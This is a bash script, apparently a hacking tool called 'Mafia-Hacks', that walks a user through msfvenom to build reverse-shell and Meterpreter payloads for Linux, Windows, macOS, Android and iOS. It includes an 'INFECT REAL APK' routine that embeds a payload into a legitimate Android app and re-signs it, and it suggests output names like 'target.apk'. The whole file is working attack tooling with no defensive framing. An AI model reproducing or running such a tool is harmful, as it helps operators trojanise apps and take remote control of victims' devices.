#!/bin/bash
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'

function banner(){                                                  
echo -e ${CP}"   ____  __    _    _____ ___    _         _   _    _    ____ _  ________      #"
echo -e ${CP}"  / /  \/  |  / \  |  ___|_ _|  / \       | | | |  / \  / ___| |/ / ___\ \     #"
echo -e ${CP}" | || |\/| | / _ \ | |_   | |  / _ \ _____| |_| | / _ \| |   | ' /\___ \| |    #"
echo -e ${CP}"< < | |  | |/ ___ \|  _|  | | / ___ \_____|  _  |/ ___ \ |___| . \ ___) |> >   #"
echo -e ${CP}" | ||_|  |_/_/   \_\_|   |___/_/   \_\    |_| |_/_/   \_\____|_|\_\____/| |    #"
echo -e ${CP}"  \_\                                                                  /_/     #"
echo -e ${CNC}"      An Advnaced Tool To Generate Payloads For All Types Of OS                #"
echo -e ${NEW}"               Generate Payloads For All OS in Seconds                         #"
echo -e ${CP}"          Follow Me On:  ${CPO}Instagram: invisibleclay100                           #"
echo -e ${CP}"                         ${PINK}Twitter:   whoami4041                                 #"
echo -e ${YELLOW}"                         Coded By :  ${CP}Machine404                                #"
echo -e ${RED}"################################################################################\n"
   
}

echo -e -n ${CNC}"\n[*] Checking  Internet Connection \n"
if nc -zw1 google.com 443; then
  echo -e ${GREEN} "\n[ ✔ ] Internet.............${GREEN}[ working ]"
  else
  
  echo ${RED}"No Internet Connection"
  exit 1
fi
sleep 0.5
function depend(){
echo -e -n ${CNC}"\n[*] Checking dependencies configuration For Android \n"
if nc -zw1 google.com 443; then
  echo -e ${GREEN} "\n[ ✔ ] Internet.............${GREEN}[ working ]"
  else
  
  echo ${RED}"No Internet Connection"
  exit 1
fi
sleep 0.5
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e ${GREEN} "\n[ ✔ ] metasploit.............${GREEN}[ found ]"
else
echo -e $red "[ X ] metasploit  -> ${RED}not found "
echo -e ${YELLOW} "[ ! ] Installing Metasploit-Framework "
sudo apt-get install metasploit-framework -y
echo -e ${BLUE} "[ ✔ ] Done installing ...."
fi
sleep 0.5
which zipalign > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e ${GREEN} "\n[ ✔ ] zipalign.............${GREEN}[ found ]"
else
echo -e $red "[ X ] zipalign  -> ${RED}not found "
echo -e ${YELLOW} "[ ! ] Installing zipalign "
sudo apt-get install zipalign -y
echo -e ${BLUE} "[ ✔ ] Done installing ...."
fi
sleep 0.5
which apktool > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e ${GREEN} "\n[ ✔ ] apktool.............${GREEN}[ found ]"
else
echo -e $red "\n[ X ] apktool...........  -> ${RED}[ Not found ]"
echo -e ${YELLOW} "\n[ ! ] Installing apktool "
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool  >/dev/null 2>&1
chmod +x apktool >/dev/null 2>&1
sudo mv apktool /usr/local/bin >/dev/null 2>&1
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.4.1.jar >/dev/null 2>&1
mv apktool*.jar apktool.jar && chmod +x apktool.jar >/dev/null 2>&1
sudo mv apktool.jar /usr/local/bin >/dev/null 2>&1
echo -e ${BLUE} "\n[ ✔ ] Done installing ...."
fi
sleep 0.5
which jarsigner > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e ${GREEN} "\n[ ✔ ] jarsigner.............${GREEN}[ found ]"
else
echo -e $red "[ X ] jarsigner  -> ${RED}not found "
echo -e ${YELLOW} "[ ! ] Installing jarsigner "
sudo apt update
sudo apt-get install openjdk-11-jdk -y
echo -e ${BLUE} "[ ✔ ] Done installing ...."
fi
sleep 0.5
which keytool > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e ${GREEN} "\n[ ✔ ] keytool.............${GREEN}[ found ]"
else
echo -e $red "[ X ] keytool  -> ${RED}not found "
echo -e ${YELLOW} "[ ! ] Installing keytool "
sudo apt update
sudo apt-get install openjdk-11-jdk -y
echo -e ${BLUE} "[ ✔ ] Done installing ...."
fi
sleep 0.5
which aapt > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e ${GREEN} "\n[ ✔ ] Aapt.............${GREEN}[ found ]"
else
echo -e $red "\n[ X ] Aapt  -> ${RED}not found "
echo -e ${YELLOW} "\n[ ! ] Installing Aapt "
sudo apt install aapt -y
echo -e ${BLUE} "[ ✔ ] Done installing ...."
fi
sleep 1
}

function normal(){
clear 
banner
echo -e "\n${NC}[${CG}"*"${NC}]${CNC} Choose Payload Creation Option\n"
echo -e "${NC}[${CG}"1"${NC}]${CP} android/meterpreter/reverse_tcp"
echo -e "${NC}[${CG}"2"${NC}]${PINK} android/meterpreter/reverse_http "
echo -e "${NC}[${CG}"3"${NC}]${NEW} android/meterpreter/reverse_https "
echo -e "${NC}[${CG}"0"${NC}]${RED} Back To Main Menu "
echo -n -e ${CPO}"\n[+] Select: "
read choose
   if [ $choose -eq 1 ]; then
         payload="android/meterpreter/reverse_tcp"
   elif [ $choose -eq 2 ]; then
          payload="android/meterpreter/reverse_http"
   elif [ $choose -eq 3 ]; then
          payload="android/meterpreter/reverse_https"
   elif [ $choose -eq 0 ]; then
             menu      
      fi

echo -e -n ${BLUE}"\nMafia@Hacks:~/LHOST# "
read lhost
echo -e -n ${NC}"\nMafia@Hacks:~/LPORT# "
read lport
echo -e -n ${PINK}"\n[+] Enter name of apk e.g (target.apk): "
read out
sleep 2

echo -e -n ${CP}"\n[+] Generating Your Apk Payload \n"
sudo msfvenom -p $payload LHOST="$lhost" LPORT="$lport" R> $out  
sleep 1
if [ ! -f $out ]; then
	echo -e -n ${RED}"[ X ] MSFVenom payload generation failed."
	exit 1
else
	

echo -e -n ${BLUE}"\n[+] Creating KeyStore Your APK \n"
keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
sleep 1
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore $out hacked
sleep 1
echo -e -n ${NC}"\n[+] Sigining Your APK \n"
jarsigner -verify -verbose -certs $out
sleep 1
echo -e -n ${NEW}"\n[+] Verifying the  APK \n"
zipalign -v 4 $out final.apk
sleep 0.5
rm -rf key.keystore
fi
rm $out
sleep 1
if [ ! -f final.apk ]; then
	echo -e -n ${RED}"[ X ] Final Apk generation failed."
	exit 1
	else
echo -e -n ${ORANGE}"\n[ ✔ ] Final Android Apk Saved As:  ${CNC}final.apk "
fi
}

function real(){
clear 
banner
echo -e "\n${NC}[${CG}"*"${NC}]${CNC} Choose Payload Creation Option\n"
echo -e "${NC}[${CG}"1"${NC}]${CN} android/meterpreter/reverse_tcp"
echo -e "${NC}[${CG}"2"${NC}]${PINK} android/meterpreter/reverse_http "
echo -e "${NC}[${CG}"3"${NC}]${NEW} android/meterpreter/reverse_https "
echo -e "${NC}[${CG}"0"${NC}]${RED} Back To Main Menu "
echo -n -e ${CPO}"\n[+] Select: "
read choose
   if [ $choose -eq 1 ]; then
         payload="android/meterpreter/reverse_tcp"
   elif [ $choose -eq 2 ]; then
          payload="android/meterpreter/reverse_http"
   elif [ $choose -eq 3 ]; then
          payload="android/meterpreter/reverse_https"
   elif [ $choose -eq 0 ]; then
           menu      
      fi
echo -e -n ${BLUE}"\nMafia@Hacks:~/LHOST# "
read lhost
echo -e -n ${NC}"\nMafia@Hacks:~/LPORT# "
read lport
echo -e -n ${PINK}"\n[+] Enter path of original APK:  "
read org
echo -e -n ${NEW}"\n[+] Enter name of output apk e.g (target.apk): "
read out
sleep 2

echo -e -n ${CP}"\n[+] Generating Your Apk Payload \n"
sudo  msfvenom -p $payload -x $org LHOST="$lhost" LPORT="$lport" -o $out  
if [[ ! -f $out  ]]; then
echo -e -n ${RED}"\n[ X ] Payload Not Generated! Going to Sleep :) "
sleep 1
exit 1
 
else
echo -e -n ${BLUE}"\n[+] Sigining Your APK \n"
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
sleep 1
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $out alias_name
sleep 1
rm -rf my-release-key.keystore
if [ ! -f $out ]; then
	echo -e -n ${RED}"[ X ] Infected Real Apk generation failed. Going to Sleep :)"
	exit 1
	else
echo -e -n ${CP}"\n[ ✔ ] Infected Original Apk Saved As: ${CNC}$out "
fi


fi



}
function windows(){
clear 
banner
echo -e "\n${NC}[${CG}"*"${NC}]${CNC} Choose Payload Creation Option\n"
echo -e "${NC}[${CG}"1"${NC}]${ORANGE} windows/meterpreter/reverse_tcp"
echo -e "${NC}[${CG}"2"${NC}]${NC} windows/meterpreter/reverse_https "
echo -e "${NC}[${CG}"3"${NC}]${BLUE} windows/meterpreter/bind_tcp "
echo -e "${NC}[${CG}"4"${NC}]${YELLOW} windows/shell/reverse_tcp "
echo -e "${NC}[${CG}"5"${NC}]${CN} windows/shell/bind_tcp "
echo -e "${NC}[${CG}"0"${NC}]${RED} Back To Main Menu "

echo -n -e ${CPO}"\n[+] Select: "
read choose
   if [ $choose -eq 1 ]; then
         payload="windows/meterpreter/reverse_tcp"
         
   elif [ $choose -eq 2 ]; then
          payload="windows/meterpreter/reverse_https"
   elif [ $choose -eq 3 ]; then
          payload="windows/meterpreter/bind_tcp"
   elif [ $choose -eq 4 ]; then
          payload="windows/shell/reverse_tcp"
   elif [ $choose -eq 5 ]; then
          payload="windows/shell/bind_tcp"
   elif [ $choose -eq 0 ]; then
               menu      
      fi
echo -e -n ${BLUE}"\nMafia@Hacks:~/LHOST# "
read lhost
echo -e -n ${NC}"\nMafia@Hacks:~/LPORT# "
read lport
echo -e -n ${PINK}"\n[+] Enter name of payload e.g (target.exe): "
read out
sleep 1
echo -e -n ${NEW}"\n[+] Generating Your Windows Payload \n"

sudo msfvenom -p $payload LHOST="$lhost" LPORT="$lport" -f exe -o $out 


if [[ ! -f $out  ]]; then
echo -e -n ${RED}"\n[ X ] Payload Not Generated! Going to Sleep :) "
sleep 1
exit 1
 
else

echo -e -n ${CNC}"\n[ ✔ ] Windows Payload Saved As $out "
fi

}
function linux(){
clear 
banner
echo -e "\n${NC}[${CG}"*"${NC}]${CNC} Choose Payload Creation Option\n"
echo -e "${NC}[${CG}"1"${NC}]${BLUE} linux/x86/meterpreter_reverse_http"
echo -e "${NC}[${CG}"2"${NC}]${NEW} linux/x86/meterpreter_reverse_https "
echo -e "${NC}[${CG}"3"${NC}]${NC} linux/x86/meterpreter/reverse_tcp "
echo -e "${NC}[${CG}"4"${NC}]${ORANGE} linux/x64/meterpreter_reverse_http "
echo -e "${NC}[${CG}"5"${NC}]${PINK} linux/x64/meterpreter_reverse_https "
echo -e "${NC}[${CG}"6"${NC}]${CP} linux/x64/meterpreter/reverse_tcp "
echo -e "${NC}[${CG}"7"${NC}]${NC} linux/x86/shell/reverse_tcp "
echo -e "${NC}[${CG}"8"${NC}]${CG} linux/x64/shell/bind_tcp "
echo -e "${NC}[${CG}"9"${NC}]${GRAY} linux/x86/meterpreter/bind_tcp "
echo -e "${NC}[${CG}"10"${NC}]${ORANGE} linux/x64/meterpreter/bind_tcp"
echo -e "${NC}[${CG}"11"${NC}]${CP} linux/x86/shell/bind_tcp"
echo -e "${NC}[${CG}"12"${NC}]${NC} linux/x64/shell/reverse_tcp "
echo -e "${NC}[${CG}"0"${NC}]${RED} Back To Main Menu "

echo -n -e ${CPO}"\n[+] Select: "
read choose
   if [ $choose -eq 1 ]; then
         payload="linux/x86/meterpreter_reverse_http"
   elif [ $choose -eq 2 ]; then
          payload="linux/x86/meterpreter_reverse_https"
   elif [ $choose -eq 3 ]; then
          payload="linux/x86/meterpreter/reverse_tcp"
   elif [ $choose -eq 4 ]; then
          payload="linux/x64/meterpreter_reverse_http"
   elif [ $choose -eq 5 ]; then
          payload="linux/x64/meterpreter_reverse_https"
   elif [ $choose -eq 6 ]; then
          payload="linux/x64/meterpreter/reverse_tcp"
   elif [ $choose -eq 7 ]; then
          payload="linux/x86/shell/reverse_tcp"
   elif [ $choose -eq 8 ]; then
          payload="linux/x64/shell/bind_tcp"
   elif [ $choose -eq 9 ]; then
          payload="linux/x86/meterpreter/bind_tcp"
   elif [ $choose -eq 10 ]; then
          payload="linux/x64/meterpreter/bind_tcp" 
   elif [ $choose -eq 11 ]; then
          payload="linux/x86/shell/bind_tcp"
   elif [ $choose -eq 12 ]; then
          payload="linux/x64/shell/reverse_tcp"
   elif [ $choose -eq 0 ]; then
          menu      
      fi
echo -e -n ${BLUE}"\nMafia@Hacks:~/LHOST# "
read lhost
echo -e -n ${NC}"\nMafia@Hacks:~/LPORT# "
read lport
echo -e -n ${PINK}"\n[+] Enter name of payload e.g (target.elf): "
read out
sleep 1
echo -e -n ${CP}"\n[+] Generating Your linux Payload \n"

sudo msfvenom -p $payload LHOST="$lhost" LPORT="$lport" -f elf -o $out 


if [[ ! -f $out  ]]; then
echo -e -n ${RED}"\n[ X ] Payload Not Generated! Going to Sleep :) "
sleep 1
exit 1
 
else

echo -e -n ${CNC}"\n[ ✔ ] linux Payload Saved As $out "
fi
}
function macos(){
clear 
banner
echo -e "\n${NC}[${CG}"*"${NC}]${CNC} Choose Payload Creation Option\n"
echo -e "${NC}[${CG}"1"${NC}]${CP} osx/x86/shell_reverse_tcp"
echo -e "${NC}[${CG}"2"${NC}]${BLUE} osx/x86/shell_bind_tcp "
echo -e "${NC}[${CG}"3"${NC}]${GRAY} osx/x64/meterpreter/bind_tcp "
echo -e "${NC}[${CG}"4"${NC}]${PINK} osx/x64/meterpreter/reverse_tcp"
echo -e "${NC}[${CG}"5"${NC}]${CG} osx/x64/meterpreter_reverse_http "
echo -e "${NC}[${CG}"6"${NC}]${NEW} osx/x64/meterpreter_reverse_https "
echo -e "${NC}[${CG}"0"${NC}]${RED} Back To Main Menu "
echo -n -e ${CPO}"\n[+] Select: "
read choose
   if [ $choose -eq 1 ]; then
         payload="osx/x86/shell_reverse_tcp"
         
   elif [ $choose -eq 2 ]; then
          payload="osx/x86/shell_bind_tcp"
   elif [ $choose -eq 3 ]; then
          payload="osx/x64/meterpreter/bind_tcp"
   elif [ $choose -eq 4 ]; then
          payload="osx/x64/meterpreter/reverse_tcp"
   elif [ $choose -eq 5 ]; then
          payload="osx/x64/meterpreter_reverse_http"
   elif [ $choose -eq 6 ]; then
          payload="osx/x64/meterpreter_reverse_https"    
  elif [ $choose -eq 0 ]; then
          menu  
      fi
echo -e -n ${BLUE}"\nMafia@Hacks:~/LHOST# "
read lhost
echo -e -n ${NC}"\nMafia@Hacks:~/LPORT# "
read lport
echo -e -n ${PINK}"\n[+] Enter name of payload e.g (target.bin): "
read out
sleep 1
echo -e -n ${CP}"\n[+] Generating Your MacOS Payload \n"

sudo msfvenom -p $payload LHOST="$lhost" LPORT="$lport" -f macho -o $out 


if [[ ! -f $out  ]]; then
echo -e -n ${RED}"\n[ X ] Payload Not Generated! Going to Sleep :) "
sleep 1
exit 1
 
else

echo -e -n ${CNC}"\n[ ✔ ] MacOS Payload Saved As $out "
fi

}
function ios(){
clear 
banner
echo -e "\n${NC}[${CG}"*"${NC}]${CNC} Choose Payload Creation Option\n"
echo -e "${NC}[${CG}"1"${NC}]${CP} apple_ios/aarch64/meterpreter_reverse_http"
echo -e "${NC}[${CG}"2"${NC}]${PINK} apple_ios/aarch64/meterpreter_reverse_https"
echo -e "${NC}[${CG}"3"${NC}]${BLUE} apple_ios/aarch64/meterpreter_reverse_tcp"
echo -e "${NC}[${CG}"4"${NC}]${CG} apple_ios/aarch64/shell_reverse_tcp"
echo -e "${NC}[${CG}"5"${NC}]${YELLOW} apple_ios/armle/meterpreter_reverse_http"
echo -e "${NC}[${CG}"6"${NC}]${NEW} apple_ios/armle/meterpreter_reverse_https"
echo -e "${NC}[${CG}"6"${NC}]${NC} apple_ios/armle/meterpreter_reverse_tcp"
echo -e "${NC}[${CG}"0"${NC}]${RED} Back To Main Menu "
echo -n -e ${CPO}"\n[+] Select: "
read choose
   if [ $choose -eq 1 ]; then
         payload="apple_ios/aarch64/meterpreter_reverse_http"
         
   elif [ $choose -eq 2 ]; then
          payload="apple_ios/aarch64/meterpreter_reverse_https"
   elif [ $choose -eq 3 ]; then
          payload="apple_ios/aarch64/meterpreter_reverse_tcp"
   elif [ $choose -eq 4 ]; then
          payload="apple_ios/aarch64/shell_reverse_tcp"
   elif [ $choose -eq 5 ]; then
          payload="apple_ios/armle/meterpreter_reverse_http"
   elif [ $choose -eq 6 ]; then
          payload="apple_ios/armle/meterpreter_reverse_https" 
   elif [ $choose -eq 7 ]; then
          payload="apple_ios/armle/meterpreter_reverse_tcp"     
   elif [ $choose -eq 0 ]; then
          menu
      fi
echo -e -n ${BLUE}"\nMafia@Hacks:~/LHOST# "
read lhost
echo -e -n ${NC}"\nMafia@Hacks:~/LPORT# "
read lport
echo -e -n ${PINK}"\n[+] Enter name of payload e.g (target.macho): "
read out
sleep 1
echo -e -n ${CP}"\n[+] Generating Your Apple_IOS Payload \n"

sudo msfvenom -p $payload LHOST="$lhost" LPORT="$lport" -f macho -o $out 


if [[ ! -f $out  ]]; then
echo -e -n ${RED}"\n[ X ] Payload Not Generated! Going to Sleep :) "
sleep 1
exit 1
 
else

echo -e -n ${CNC}"\n[ ✔ ] Apple_IOS Payload Saved As $out "
fi
}
function android(){
clear
banner
depend
clear
banner

echo -e "\n${NC}[${CG}"1"${NC}]${BLUE} Normal APK PAYLOAD"
echo -e "${NC}[${CG}"2"${NC}]${ORANGE} INFECT REAL APK "
echo -e "${NC}[${CG}"3"${NC}]${RED} Back To Main Menu "
echo -n -e ${CPO}"\n[+] Select: "
read play
   if [ $play -eq 1 ]; then
          normal
   elif [ $play -eq 2 ]; then
          real
   elif [ $play -eq 3 ]; then
          menu
         
      fi
}
menu(){
clear
banner
echo -e "\n${NC}[${CG}"*"${NC}]${CNC} Choose OS Type For Payload Creation \n"
echo -e "${NC}[${CG}"1"${NC}]${ORANGE} Linux"
echo -e "${NC}[${CG}"2"${NC}]${BLUE} Windows"
echo -e "${NC}[${CG}"3"${NC}]${CG} MacOS "
echo -e "${NC}[${CG}"4"${NC}]${YELLOW} Android"
echo -e "${NC}[${CG}"5"${NC}]${CP} Apple_IOS "
echo -e "${NC}[${CG}"6"${NC}]${RED} EXIT "
echo -n -e ${CPO}"\n[+] Select: "
read play
   if [ $play -eq 1 ]; then
          linux
   elif [ $play -eq 2 ]; then
          windows
   elif [ $play -eq 3 ]; then
          macos
   elif [ $play -eq 4 ]; then
          android    
   elif [ $play -eq 5 ]; then
          ios 
  elif [ $play -eq 6 ]; then
          exit
      fi
}
menu
#Coded By Machine404....Copying this code doesn't make you........nerd!
